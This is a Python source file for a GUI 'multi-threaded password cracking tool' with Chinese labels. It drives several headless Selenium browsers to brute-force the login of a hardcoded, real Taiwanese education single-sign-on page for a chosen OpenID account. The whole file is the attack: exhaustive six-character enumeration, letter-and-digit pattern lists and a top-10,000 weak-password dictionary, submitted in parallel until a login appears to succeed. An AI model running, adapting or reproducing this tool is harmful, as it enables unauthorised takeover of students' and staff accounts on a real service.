import tkinter as tk
from tkinter import ttk, messagebox
from threading import Thread, Lock
from queue import Queue
from time import sleep as sl, time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

BIG_EN = [
    "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M",
    "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"
]

SMALL_EN = [
    "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
    "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"
]

CONTINUOUS_EN = [
    # 三字母重複組合（小寫）
    "aaa", "bbb", "ccc", "ddd", "eee", "fff", "ggg", "hhh", "iii", "jjj",
    "kkk", "lll", "mmm", "nnn", "ooo", "ppp", "qqq", "rrr", "sss", "ttt",
    "uuu", "vvv", "www", "xxx", "yyy", "zzz",
    
    # 大小寫英文配對
    "Aa", "Bb", "Cc", "Dd", "Ee", "Ff", "Gg", "Hh", "Ii", "Jj", "Kk", "Ll", "Mm",
    "Nn", "Oo", "Pp", "Qq", "Rr", "Ss", "Tt", "Uu", "Vv", "Ww", "Xx", "Yy", "Zz",
    
    # 三字母重複組合（大寫）
    "AAA", "BBB", "CCC", "DDD", "EEE", "FFF", "GGG", "HHH", "III", "JJJ",
    "KKK", "LLL", "MMM", "NNN", "OOO", "PPP", "QQQ", "RRR", "SSS", "TTT",
    "UUU", "VVV", "WWW", "XXX", "YYY", "ZZZ",
    
    # 連續字母組合
    "abc", "ABC", "Abc", "abcd", "ABCD", "Abcd", "abcde", "ABCDE", "Abcde",
    "abcdef", "ABCDEF", "Abcdef", "abcdefg", "ABCDEFG", "Abcdefg",
    "abcdefgh", "ABCDEFGH", "Abcdefgh", "abcdefghi", "ABCDEFGHI", "Abcdefghi",
    "abcdefghij", "ABCDEFGHIJ", "Abcdefghij",
]

MATH = [
    # 連續數字 (1-9位數)
    "12", "123", "1234", "12345", "123456", "1234567", "12345678", "123456789",
    "01", "012", "0123", "01234", "012345", "0123456", "01234567", "012345678", "0123456789",
    
    # 重複數字 (1-6位數)
    "0", "00", "000", "0000", "00000", "000000",
    "1", "11", "111", "1111", "11111", "111111",
    "2", "22", "222", "2222", "22222", "222222", 
    "3", "33", "333", "3333", "33333", "333333",
    "4", "44", "444", "4444", "44444", "444444",
    "5", "55", "555", "5555", "55555", "555555",
    "6", "66", "666", "6666", "66666", "666666",
    "7", "77", "777", "7777", "77777", "777777",
    "8", "88", "888", "8888", "88888", "888888",
    "9", "99", "999", "9999", "99999", "999999"
]

URL = "https://kh.sso.edu.tw/auth-server-stlogin?Auth_Request_RedirectUri=https%253A%252F%252Foidc.tanet.edu.tw%252Fcncreturnpage&Auth_Request_State=a1h8GqiVsrDoNh4wHfqx3IIcWZbx0JrRRDGpc8cGzRk&Auth_Request_Response_Type=code&Auth_Request_Client_ID=cf789350df91c914eede027ce55f3ab5&Auth_Request_Nonce=bKyFuJbbQXulFBTlu3yv5o16-UOKzp4QaK7gfId4Op0&Auth_Request_Scope=openid+exchangedata&local=true"

class PasswordCrackerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("多線程密碼破解工具")
        self.root.geometry("600x600")
        
        # Thread control
        self.password_queue = Queue()
        self.result_queue = Queue()
        self.threads = []
        self.thread_count = 4
        self.lock = Lock()
        
        # 創建主框架
        self.main_frame = ttk.Frame(root, padding="10")
        self.main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        # OpenID 輸入
        ttk.Label(self.main_frame, text="OpenID 帳號:").grid(row=0, column=0, sticky=tk.W, pady=5)
        self.openid_var = tk.StringVar()
        self.openid_entry = ttk.Entry(self.main_frame, textvariable=self.openid_var, width=40)
        self.openid_entry.grid(row=0, column=1, columnspan=2, sticky=tk.W, pady=5)
        
        # 模式選擇
        ttk.Label(self.main_frame, text="破解模式:").grid(row=1, column=0, sticky=tk.W, pady=5)
        self.mode_var = tk.StringVar(value="base36")
        modes = [
            ("36進制6位破解", "base36"),
            ("常用連續字母破解", "continuous"),
            ("大寫開頭破解", "upper"),
            ("小寫開頭破解", "lower"),
            ("弱口令字典破解", "weak"),
            ("全模式破解", "all")
        ]
        
        # 使用Radiobutton來選擇模式
        mode_frame = ttk.LabelFrame(self.main_frame, text="選擇模式", padding="5")
        mode_frame.grid(row=2, column=0, columnspan=3, sticky=tk.W, pady=5)
        
        for i, (text, value) in enumerate(modes):
            ttk.Radiobutton(mode_frame, text=text, value=value, 
                          variable=self.mode_var).grid(row=i//2, column=i%2, sticky=tk.W, padx=5, pady=2)
            
        # 忽略位數選項
        self.ignore_var = tk.BooleanVar()
        ttk.Checkbutton(self.main_frame, text="忽略特定位數以下的密碼", 
                       variable=self.ignore_var, command=self.toggle_ignore_digits).grid(
            row=3, column=0, columnspan=2, sticky=tk.W, pady=5)
        
        # 位數輸入
        self.digits_frame = ttk.Frame(self.main_frame)
        self.digits_frame.grid(row=4, column=0, columnspan=2, sticky=tk.W, pady=5)
        ttk.Label(self.digits_frame, text="忽略位數:").grid(row=0, column=0, padx=5)
        self.digits_var = tk.StringVar(value="6")
        self.digits_entry = ttk.Entry(self.digits_frame, textvariable=self.digits_var, width=5)
        self.digits_entry.grid(row=0, column=1)
        self.digits_entry.configure(state='disabled')
        
        # 進度顯示
        self.progress_frame = ttk.LabelFrame(self.main_frame, text="執行進度", padding="5")
        self.progress_frame.grid(row=5, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=10)
        
        self.status_var = tk.StringVar(value="準備就緒")
        ttk.Label(self.progress_frame, textvariable=self.status_var).grid(
            row=0, column=0, sticky=tk.W, pady=5)
        
        self.current_password_var = tk.StringVar()
        ttk.Label(self.progress_frame, text="當前嘗試密碼:").grid(row=1, column=0, sticky=tk.W)
        ttk.Label(self.progress_frame, textvariable=self.current_password_var).grid(
            row=1, column=1, sticky=tk.W)
        
        ttk.Label(self.progress_frame, text="总尝试次数:").grid(row=2, column=0, sticky=tk.W)
        self.total_attempts_var = tk.StringVar(value="0")
        ttk.Label(self.progress_frame, textvariable=self.total_attempts_var).grid(
            row=2, column=1, sticky=tk.W)
        
        ttk.Label(self.progress_frame, text="每秒尝试次数:").grid(row=3, column=0, sticky=tk.W)
        self.attempts_per_sec_var = tk.StringVar(value="0")
        ttk.Label(self.progress_frame, textvariable=self.attempts_per_sec_var).grid(
            row=3, column=1, sticky=tk.W)
        
        # 统计变量
        self.total_attempts = 0
        self.attempts_per_second = 0
        self.last_update_time = time()
        
        # 線程數量選擇器
        thread_frame = ttk.Frame(self.main_frame)
        thread_frame.grid(row=6, column=0, columnspan=3, pady=5)
        ttk.Label(thread_frame, text="執行緒數量:").grid(row=0, column=0, padx=5)
        self.thread_var = tk.StringVar(value="4")
        thread_spinbox = ttk.Spinbox(thread_frame, from_=1, to=8, 
                                   textvariable=self.thread_var, width=5)
        thread_spinbox.grid(row=0, column=1)
        
        # 控制按鈕
        self.button_frame = ttk.Frame(self.main_frame)
        self.button_frame.grid(row=7, column=0, columnspan=3, pady=10)
        
        self.start_button = ttk.Button(self.button_frame, text="開始", command=self.start_cracking)
        self.start_button.grid(row=0, column=0, padx=5)
        
        self.stop_button = ttk.Button(self.button_frame, text="停止", command=self.stop_cracking)
        self.stop_button.grid(row=0, column=1, padx=5)
        self.stop_button.configure(state='disabled')
        
        self.exit_button = ttk.Button(self.button_frame, text="退出", command=self.exit_app)
        self.exit_button.grid(row=0, column=2, padx=5)
        
        self.running = False

    def toggle_ignore_digits(self):
        if self.ignore_var.get():
            self.digits_entry.configure(state='normal')
        else:
            self.digits_entry.configure(state='disabled')

    def update_status(self, message):
        self.status_var.set(message)
        self.root.update()

    def update_current_password(self, password):
        self.current_password_var.set(password)
        self.root.update()

    def create_browser(self):
        chrome_options = webdriver.ChromeOptions()
        chrome_options.add_argument('--headless')
        driver = webdriver.Chrome(options=chrome_options)
#        driver = webdriver.Chrome()
        driver.set_window_size(375, 512)
        driver.get(URL)
        return driver

    def verify_login_available(self, driver):
        """检查登录页面是否可用"""
        try:
            login = driver.find_element(By.ID, "idf")
            return True
        except Exception:
            return False  # 不直接显示错误，让调用者处理

    def collect_last_passwords(self):
        """收集所有线程最后尝试的密码"""
        last_passwords = []
        for thread in self.threads:
            if hasattr(thread, 'last_password'):
                last_passwords.append(thread.last_password)
        return last_passwords

    def verify_passwords_sequence(self, passwords):
        """单线程逐一验证密码"""
        driver = self.create_browser()
        try:
            for password in passwords:
                if not self.running:
                    break
                    
                if not self.verify_login_available(driver):
                    messagebox.showinfo("成功", f"密码可能是：{password}\n(顺序验证时发现)")
                    return password
                    
                self.try_password(password, driver)
                sl(0.1)  # 稍微延迟确保页面反应
                
        finally:
            driver.quit()
        return None

    def password_worker(self):
        """Worker thread for password attempts"""
        driver = self.create_browser()
        last_password = None
        
        while self.running:
            try:
                password = self.password_queue.get(timeout=1)
                if password is None:
                    break
                
                # 储存当前密码
                last_password = password
                
                # 等待遮罩消失并重试
                max_retries = 3
                retry_count = 0
                
                while retry_count < max_retries and self.running:
                    try:
                        # 使用WebDriverWait等待按钮可点击
                        WebDriverWait(driver, 10).until(
                            EC.element_to_be_clickable((By.ID, "idf"))
                        )
                        
                        if self.try_password(password, driver):
                            with self.lock:
                                self.result_queue.put(password)
                                self.running = False
                            break
                            
                        break  # 尝试成功
                        
                    except Exception as e:
                        retry_count += 1
                        if retry_count == max_retries:
                            print(f"密码 {password} 达到最大重试次数")
                            with self.lock:
                                # 储存以供验证
                                self.result_queue.put(last_password)
                            break
                        sl(0.5)  # 重试前等待
                
                self.password_queue.task_done()
                
            except Queue.Empty:
                continue
            except Exception as e:
                print(f"线程错误: {str(e)}")
                break
                
        driver.quit()

    def verify_sequence(self, passwords):
        """验证序列处理"""
        result = self.verify_passwords_sequence(passwords)
        if result:
            with self.lock:
                self.result_queue.put(result)
                self.running = False
                self.update_status("破解完成")
        else:
            self.update_status("验证未发现正确密码")

    def try_password(self, password, driver):
        if not self.running:
            return True
        
        if self.ignore_var.get():
            try:
                ignore_digits = int(self.digits_var.get())
                if len(password.lstrip('0')) < ignore_digits:
                    return False
            except ValueError:
                pass
            
        with self.lock:
            self.update_current_password(password)
            self.update_stats()
        
        try:
            username = driver.find_element(By.NAME, "username")
            passwd = driver.find_element(By.NAME, "password")
            login_button = driver.find_element(By.ID, "idf")
            
            # 等待遮罩消失
            WebDriverWait(driver, 10).until(
                EC.invisibility_of_element_located(
                    (By.CLASS_NAME, "blockUI")
                )
            )
            
            username.clear()
            passwd.clear()
            username.send_keys(self.openid_var.get())
            passwd.send_keys(password)
            
            # 滚动到按钮位置
            driver.execute_script("arguments[0].scrollIntoView(true);", login_button)
            
            # 等待按钮可点击并点击
            try:
                WebDriverWait(driver, 10).until(
                    EC.element_to_be_clickable((By.ID, "idf"))
                ).click()
            except:
                self.update_status(f"正在验证密码: {password}")
                return True  # 按钮不可点击可能意味着已登录
            
            sl(0.5)  # 等待页面响应
            
            # 检查登录结果
            try:
                driver.find_element(By.ID, "idf")
                return False  # 仍能找到登录按钮，说明登录失败
            except:
                self.update_status(f"找到可能的密碼: {password}")
                if messagebox.askyesno("確認", f"密碼可能是: {password}\n是否確認並退出？"):
                    self.password_found(password)
                    return True
                return False
                
        except Exception as e:
            print(f"嘗試密碼 {password} 時出錯: {str(e)}")
            self.update_status(f"嘗試密碼出錯: {password}")
            return False

    def start_cracking(self):
        """修改启动方法，添加初始检查"""
        if not self.openid_var.get():
            messagebox.showerror("错误", "请输入OpenID账号")
            return
        
        try:
            self.thread_count = int(self.thread_var.get())
        except ValueError:
            messagebox.showerror("错误", "执行线程数量必须是数字")
            return

        # 先测试一个浏览器实例确保可以访问
        test_driver = self.create_browser()
        if not self.verify_login_available(test_driver):
            test_driver.quit()
            messagebox.showerror("错误", "无法访问登录页面")
            return
        test_driver.quit()

        self.running = True
        self.start_button.configure(state='disabled')
        self.stop_button.configure(state='normal')
        
        # 启动工作线程
        self.threads = []
        for _ in range(self.thread_count):
            t = Thread(target=self.password_worker)
            t.daemon = True
            t.start()
            self.threads.append(t)
        
        Thread(target=self.generate_passwords).start()

    def generate_passwords(self):
        mode = self.mode_var.get()
        
        if mode == "base36":
            self.generate_base36()
        elif mode == "continuous":
            self.generate_continuous()
        elif mode == "upper":
            self.generate_upper()
        elif mode == "lower":
            self.generate_lower()
        elif mode == "weak":
            self.generate_weak()
        elif mode == "all":
            self.generate_all()
            
        for _ in range(self.thread_count):
            self.password_queue.put(None)

    def check_result(self):
        while self.running:
            try:
                password = self.result_queue.get(timeout=1)
                messagebox.showinfo("成功", f"密碼破解成功！密碼是：{password}")
                self.stop_cracking()
                break
            except Queue.Empty:
                continue

    def generate_base36(self):
        chars = "0123456789abcdefghijklmnopqrstuvwxyz"
        for i in range(36**6):
            if not self.running:
                break
            password = ""
            num = i
            for _ in range(6):
                password = chars[num % 36] + password
                num //= 36
            self.password_queue.put(password)

    def generate_continuous(self):
        for i in CONTINUOUS_EN:
            if not self.running:
                break
            for r in MATH:
                if not self.running:
                    break
                self.password_queue.put(i + r)

    def generate_upper(self):
        for i in BIG_EN:
            if not self.running:
                break
            for r in MATH:
                if not self.running:
                    break
                self.password_queue.put(i + r)

    def generate_lower(self):
        for i in SMALL_EN:
            if not self.running:
                break
            for r in MATH:
                if not self.running:
                    break
                self.password_queue.put(i + r)

    def generate_weak(self):
        try:
            with open("passwd-CN-Top10000.txt", "r", encoding='utf-8') as file:
                for line in file:
                    if not self.running:
                        break
                    self.password_queue.put(line.strip())
        except Exception as e:
            messagebox.showerror("錯誤", f"讀取密碼字典時發生錯誤：{str(e)}")

    def generate_all(self):
        generators = [
            self.generate_base36,
            self.generate_continuous, 
            self.generate_upper,
            self.generate_lower,
            self.generate_weak
        ]
        
        for generator in generators:
            if not self.running:
                break
            self.update_status(f"執行模式: {generator.__name__}")
            generator()
    
    def stop_cracking(self):
        self.running = False
        
        while not self.password_queue.empty():
            try:
                self.password_queue.get_nowait()
            except Queue.Empty:
                break
                
        for thread in self.threads:
            thread.join(timeout=1)
            
        self.threads.clear()
        self.start_button.configure(state='normal')
        self.stop_button.configure(state='disabled')
        
        # 重置统计数据
        self.total_attempts = 0
        self.attempts_per_second = 0
        self.last_update_time = time()
        
        self.update_status("已停止")

    def update_stats(self):
        current_time = time()
        time_diff = current_time - self.last_update_time
        
        if time_diff >= 1.0:  # 每秒更新一次
            self.attempts_per_second = int(self.thread_count / time_diff)
            self.attempts_per_sec_var.set(str(self.attempts_per_second))
            self.last_update_time = current_time
        
        self.total_attempts += 1
        self.total_attempts_var.set(str(self.total_attempts))

    def exit_app(self):
        """安全退出应用程序"""
        if self.running:
            if messagebox.askyesno("確認", "破解正在進行中，確定要退出嗎？"):
                self.stop_cracking()
            else:
                return
        self.root.quit()
        self.root.destroy()

    def password_found(self, password):
        """处理找到密码的情况"""
        messagebox.showinfo("成功", f"密碼破解成功！密碼是：{password}")
        if messagebox.askyesno("確認", "是否退出程序？"):
            self.exit_app()

def main():
    root = tk.Tk()
    app = PasswordCrackerGUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()